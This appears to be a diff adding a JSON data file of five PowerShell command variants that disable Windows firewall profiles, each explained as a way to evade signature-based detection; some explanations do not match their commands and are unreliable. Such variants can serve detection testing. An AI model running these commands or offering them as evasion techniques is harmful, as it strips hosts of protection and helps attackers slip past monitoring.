@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"Set-NetFirewallProfile -Profile `\"Private`\" -Enabled False\"",
+    "explanation": "Inserted escape characters (`) around the profile name to bypass detection while maintaining valid PowerShell syntax."
+  },
+  {
+    "output": "powershell.exe -Command Set-NetFirewallProfile -Profile Private -Enabled:0",
+    "explanation": "Removed the space after -Enabled and used the colon syntax as an equivalent substitution to evade signature-based detection."
+  },
+  {
+    "output": "powershell.exe -Command Set-NetFirewallProfile -Profile Public -Enabled $false",
+    "explanation": "Used PowerShell's boolean variable syntax ($false) instead of the string 'False' to alter the command structure safely."
+  },
+  {
+    "output": "powershell.exe -Command Set-NetFirewallProfile -Profile Domain -Enabled False",
+    "explanation": "Reordered and simplified the command line by removing unnecessary quotes and using direct boolean syntax."
+  },
+  {
+    "output": "powershell.exe -Command Set-NetFirewallProfile -Profile Private -Enabled False -All",
+    "explanation": "Added the -All flag as an optional parameter that does not affect the core functionality but changes the command structure."
+  }
+]
